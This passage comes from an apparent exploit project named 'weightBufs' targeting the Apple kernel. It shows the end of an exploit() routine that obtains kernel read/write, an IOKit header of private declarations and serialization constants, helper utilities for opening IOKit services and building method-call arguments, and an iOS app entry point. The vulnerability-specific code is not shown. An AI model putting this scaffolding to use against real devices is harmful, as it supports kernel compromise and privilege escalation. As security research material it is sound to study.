        if(!get_kernel_rw())
                return -1;

        cleanup();
        show_device_spec();

        return 0;
}

#if TARGET_OS_OSX
int main()
{
        return exploit();
}
#endif

```

`exploit/iokit.h`:

```h
#ifndef _IOKIT_H
#define _IOKIT_H

#ifdef __cplusplus
extern "C" {
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_time.h>
#include <CoreFoundation/CoreFoundation.h>

#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>

#define False  0
#define True   1


#define CHECK_IOKIT_ERR(kr,name)  do {                          \
                if (kr != KERN_SUCCESS) {                       \
                        printf("%s : %s (0x%x)\n",              \
                               name,mach_error_string(kr),kr);  \
                }                                               \
        }while(0);
        typedef uint64_t u64;
        typedef uint32_t u32;


CFNumberRef CFInt32(int32_t value);
CFNumberRef CFInt64(int64_t value);

enum {
        kOSSerializeDictionary   = 0x01000000U,
        kOSSerializeArray        = 0x02000000U,
        kOSSerializeSet          = 0x03000000U,
        kOSSerializeNumber       = 0x04000000U,
        kOSSerializeSymbol       = 0x08000000U,
        kOSSerializeString       = 0x09000000U,
        kOSSerializeData         = 0x0a000000U,
        kOSSerializeBoolean      = 0x0b000000U,
        kOSSerializeObject       = 0x0c000000U,
        kOSSerializeTypeMask     = 0x7F000000U,
        kOSSerializeDataMask     = 0x00FFFFFFU,

        kOSSerializeEndCollection = 0x80000000U,
};

// IOKIT
typedef mach_port_t io_connect_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_iterator_t;
typedef mach_port_t io_object_t;
typedef mach_port_t io_registry_entry_t;

#ifndef IO_OBJECT_NULL
#define IO_OBJECT_NULL 0
#endif
extern const mach_port_t kIOMasterPortDefault;

kern_return_t IOConnectCallMethod(mach_port_t connection, uint32_t selector, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallAsyncMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt);
        kern_return_t IOConnectMapMemory(io_connect_t connect, uint32_t memoryType, task_port_t intoTask, mach_vm_address_t *atAddress, mach_vm_size_t *ofSize, uint32_t options);
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type,io_connect_t *connect);
kern_return_t IOServiceGetMatchingServices(mach_port_t masterPort, CFDictionaryRef matching, io_iterator_t *existing);
kern_return_t IOServiceClose(io_connect_t connect);
uint32_t IOObjectGetRetainCount(io_object_t object);
uint32_t IOObjectGetKernelRetainCount(io_object_t object);
uint32_t IOObjectGetRetainCount(io_object_t object);
kern_return_t io_object_get_retain_count(mach_port_t object,uint32_t *retainCount);
kern_return_t IOObjectRelease(io_object_t object);
kern_return_t IORegistryEntrySetCFProperties(io_registry_entry_t entry, CFTypeRef properties);
kern_return_t IOConnectSetNotificationPort(io_connect_t connect, uint32_t type, mach_port_t port, uintptr_t reference);
CFMutableDictionaryRef IOServiceMatching(const char *name);
CFDataRef IOCFSerialize(CFTypeRef object, CFOptionFlags options);
CFTypeRef IOCFUnserialize(const char *buffer, CFAllocatorRef allocator, CFOptionFlags options, CFStringRef *errorString);

typedef struct {
        io_connect_t client;
        uint8_t *sInput;
        uint32_t sInputSize;
        uint8_t * sOutput;
        size_t sOutputSize;
        mach_port_t asyncAwake;
        uint64_t references[8];
        uint32_t referenceCnt;
        uint64_t scalarI[0x10];
        uint64_t scalarO[0x10];
        uint32_t scalarISize;
        size_t scalarOSize;
} IOKit_args_t;

void hexdump(const void* data, size_t size);
io_connect_t iokit_get_connection(const char *name,unsigned int type);
IOKit_args_t * allocate_args(uint32_t InSize,uint32_t OutSize,bool has_mp);
void destroy_args(IOKit_args_t *);

        char * load_file(const char* filename, vm_size_t * size);

#ifdef __cplusplus
}
#endif
#endif

```

`exploit/utils.c`:

```c
#include "iokit.h"

char * load_file(const char* filename, vm_size_t * size) {
        int fd = open(filename,O_RDONLY);
        if(fd < 0) {
                perror("load_file(): %s \n");
        }
        assert(fd > 0);

        struct stat st = {};
        int err = fstat(fd,&st);
        assert(err == 0);

        void *ptr = mmap(0,round_page(st.st_size),PROT_READ | PROT_WRITE,MAP_FILE | MAP_PRIVATE, fd,0);
        assert(ptr != (void*)-1);
        *size = round_page(st.st_size);
        close(fd);

        return (char*)ptr;
}

io_connect_t iokit_get_connection(const char *name,unsigned int type)
{
        io_service_t service  = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                            IOServiceMatching(name));
        if (service == IO_OBJECT_NULL) {
                printf("unable to find service \n");
                exit(-1);
        }

        io_connect_t conn = MACH_PORT_NULL;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), type, &conn);
        if(kr != KERN_SUCCESS) {
                printf("[x] Could not open %s: %s\n",name,mach_error_string(kr));
                exit(-1);

        }
        return conn;
}


IOKit_args_t * allocate_args(uint32_t InSize,uint32_t OutSize,bool has_mp)
{
        IOKit_args_t *args = (IOKit_args_t *)calloc(sizeof(IOKit_args_t),1);
        args->sInput = (uint8_t *)calloc(InSize,1);
        args->sOutput = (uint8_t *)calloc(OutSize,1);

        args->sInputSize = InSize;
        args->sOutputSize = OutSize;

        if(has_mp) {
                mach_port_t mp = 0;
                if(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &mp))
                        assert(false);
                args->asyncAwake  = mp;
        }
        return args;
}

void destroy_args(IOKit_args_t *args)
{
        if(args->sInput) free(args->sInput);
        if(args->sOutput) free(args->sOutput);

        if(args->asyncAwake)
                ;//mach_port_destroy(mach_task_self(),args->asyncAwake);

        args->sInput = args->sOutput = NULL;
        free(args);


}


CFNumberRef CFInt32(int32_t value)
{
        return CFNumberCreate(NULL, kCFNumberSInt32Type, &value);
}

CFNumberRef CFInt64(int64_t value)
{
        return CFNumberCreate(NULL, kCFNumberSInt64Type, &value);
}


void hexdump(const void* data, size_t size)
{
        char ascii[17];
        size_t i, j;
        ascii[16] = '\0';
        for (i = 0; i < size; ++i) {
                printf("%02X ", ((unsigned char*)data)[i]);
                if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
                        ascii[i % 16] = ((unsigned char*)data)[i];
                } else
                        ascii[i % 16] = '.';

                if ((i+1) % 8 == 0 || i+1 == size) {
                        printf(" ");
                        if ((i+1) % 16 == 0)
                                printf("|  %s \n", ascii);
                        else if (i+1 == size) {
                                ascii[(i+1) % 16] = '\0';
                                if ((i+1) % 16 <= 8) {
                                        printf(" ");
                                }
                                for (j = (i+1) % 16; j < 16; ++j)
                                        printf("   ");

                                printf("|  %s \n", ascii);
                        }
                }
        }
}

```

`main.m`:

```m
//
//  main.m
//  weightBufs
//
//  Created by simo on 06/06/2022.
//

#import <UIKit/UIKit.h>
#import "AppDelegate.h"

int main(int argc, char * argv[]) {
    NSString * appDelegateClassName;
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
        appDelegateClassName = NSStringFromClass([AppDelegate class]);
    }
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}

```